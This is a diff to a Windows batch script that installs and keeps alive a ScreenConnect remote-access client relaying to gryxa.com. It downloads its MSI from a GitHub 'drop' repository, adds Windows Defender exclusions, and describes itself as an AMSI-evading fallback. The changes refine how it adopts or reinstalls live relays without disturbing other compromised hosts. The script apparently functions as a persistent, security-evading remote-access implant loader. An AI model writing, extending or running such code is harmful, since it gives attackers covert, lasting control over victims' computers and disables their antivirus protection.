@@ -1,5 +1,6 @@
 @echo off
-rem OWN_GRYXA BUILD 20260804G9 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem OWN_GRYXA BUILD 20260804G10 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem G10: NEVER msiexec /x ProductCode (shared GUID killed other Gryxa FPs e.g. 9908198e). OBSERVE aborts all mutate.
 rem G9: HEAL never msiexec /x (start-only or /i-if-1060). REINSTALL aborts if any gryxa.com relay RUNNING.
 rem G8: HEAL soft-starts first; never /x while relay Gryxa RUNNING (was killing online Guests).
 rem G7: never bare sc create; after /i require ImagePath gryxa.com.
@@ -22,13 +23,27 @@ set "CURL=%SystemRoot%\System32\curl.exe"
 set "MSI=%STAGE%\pkg_gryxa.msi"
 set "LOG=%WD%\own_gryxa.log"
 set "LOCK=%WD%\gryxa_msi.lock"
-set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 set "URL1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
 set "SVC=ScreenConnect Client (%GRYXA_FP%)"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
-echo [%DATE% %TIME%] own_gryxa G9 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
+echo [%DATE% %TIME%] own_gryxa G10 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
+
+rem G10: OBSERVE = record-only, never stop/delete/install
+if exist "%WD%\observe.flag" (
+  echo [%DATE% %TIME%] OBSERVE_abort_no_mutate>>"%LOG%"
+  call :FindLiveRelay
+  if defined LIVE_FP (
+    (
+      echo CURRENT_FP=!LIVE_FP!
+      echo RELAY=update.gryxa.com
+      echo UI=ui.gryxa.com
+      echo UPDATED=cmd-own_gryxa-G10-observe
+    ) >"%WD%\gryxa.cfg"
+  )
+  exit /b 0
+)
 
 if exist "%LOCK%" (
   powershell -NoProfile -NonInteractive -Command "if((Test-Path '%LOCK%') -and (((Get-Date)-(Get-Item -LiteralPath '%LOCK%').LastWriteTime).TotalMinutes -lt 20)){exit 0}else{exit 1}" >nul 2>&1
@@ -46,7 +61,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%STAGE%"
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
 
-rem Adopt any live Gryxa relay — never /x it (HEAL and REINSTALL)
+rem Adopt any live Gryxa relay — never touch it
 call :FindLiveRelay
 if defined LIVE_FP (
   echo [%DATE% %TIME%] live_relay_adopt fp=!LIVE_FP! mode=%MODE%>>"%LOG%"
@@ -54,7 +69,7 @@ if defined LIVE_FP (
     echo CURRENT_FP=!LIVE_FP!
     echo RELAY=update.gryxa.com
     echo UI=ui.gryxa.com
-    echo UPDATED=cmd-own_gryxa-G9-adopt
+    echo UPDATED=cmd-own_gryxa-G10-adopt
   ) >"%WD%\gryxa.cfg"
   del /f /q "%LOCK%" >nul 2>&1
   exit /b 0
@@ -78,7 +93,7 @@ if /I "%MODE%"=="HEAL" (
         echo CURRENT_FP=!LIVE_FP!
         echo RELAY=update.gryxa.com
         echo UI=ui.gryxa.com
-        echo UPDATED=cmd-own_gryxa-G9-heal-start
+        echo UPDATED=cmd-own_gryxa-G10-heal-start
       ) >"%WD%\gryxa.cfg"
       del /f /q "%LOCK%" >nul 2>&1
       exit /b 0
@@ -100,7 +115,7 @@ if /I "%MODE%"=="HEAL" (
       echo CURRENT_FP=!LIVE_FP!
       echo RELAY=update.gryxa.com
       echo UI=ui.gryxa.com
-      echo UPDATED=cmd-own_gryxa-G9-heal-i
+      echo UPDATED=cmd-own_gryxa-G10-heal-i
     ) >"%WD%\gryxa.cfg"
     del /f /q "%LOCK%" >nul 2>&1
     exit /b 0
@@ -143,28 +158,25 @@ if "%REINSTALL%"=="0" (
 rem REINSTALL path only — final live check (race)
 call :FindLiveRelay
 if defined LIVE_FP (
-  echo [%DATE% %TIME%] abort_x_still_live fp=!LIVE_FP!>>"%LOG%"
+  echo [%DATE% %TIME%] abort_reinstall_still_live fp=!LIVE_FP!>>"%LOG%"
   (
     echo CURRENT_FP=!LIVE_FP!
     echo RELAY=update.gryxa.com
     echo UI=ui.gryxa.com
-    echo UPDATED=cmd-own_gryxa-G9-abort-x
+    echo UPDATED=cmd-own_gryxa-G10-abort-reinstall
   ) >"%WD%\gryxa.cfg"
   del /f /q "%LOCK%" >nul 2>&1
   exit /b 0
 )
 
-rem strip Gryxa then /i (explicit REINSTALL and nothing live)
-echo [%DATE% %TIME%] preclean_gryxa_only pc=%PC%>>"%LOG%"
+rem G10: FP-local cleanup ONLY — never msiexec /x shared ProductCode
+echo [%DATE% %TIME%] preclean_fp_only_NO_msiexec_x fp=%GRYXA_FP%>>"%LOG%"
 sc stop "%SVC%" >nul 2>&1
 timeout /t 3 /nobreak >nul
-msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
-reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
-reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
 sc delete "%SVC%" >nul 2>&1
 if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" rmdir /s /q "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
 if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-timeout /t 5 /nobreak >nul
+timeout /t 3 /nobreak >nul
 
 call :FetchMsi
 if errorlevel 1 (
@@ -195,7 +207,7 @@ sc start "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
   echo CURRENT_FP=%GRYXA_FP%
   echo RELAY=update.gryxa.com
   echo UI=ui.gryxa.com
-  echo UPDATED=cmd-own_gryxa-G9
+  echo UPDATED=cmd-own_gryxa-G10
 ) >"%WD%\gryxa.cfg"
 
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\%SVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
